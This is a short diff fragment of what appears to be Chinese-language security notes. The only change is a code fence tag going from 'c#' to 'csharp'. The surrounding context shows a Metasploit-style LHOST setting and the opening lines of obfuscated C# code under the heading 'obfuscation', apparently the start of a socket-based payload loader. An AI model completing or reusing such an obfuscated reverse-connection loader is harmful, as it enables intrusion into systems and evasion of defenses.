@@ -14,7 +14,7 @@ LHOST => 192.168.1.107
 ```
 
 混淆：
-```c#
+```csharp
 using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.
 namespace RkfCHtll { class LiNGeDokqnEH {
 static byte[] idCWVw(string VVUUJUQytjlL, int eMcukOUqFuHbUv) {
